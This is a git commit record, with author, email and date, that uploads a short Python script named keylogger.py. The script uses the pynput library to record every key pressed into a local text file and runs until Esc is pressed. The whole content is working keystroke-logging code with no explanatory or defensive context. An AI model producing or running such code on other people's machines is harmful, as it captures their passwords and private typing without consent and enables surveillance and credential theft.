a52b4d098398b8a8a105e1ed03f9542b56712480
BigJ1m <bj474006@gmail.com>
2025-05-07 10:29:03 +0800

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,12 @@
+from pynput.keyboard import Key, Listener
+
+def on_press(key):
+    with open("keystroke_log.txt", "a") as log:
+        log.write(str(key) + "\n")
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
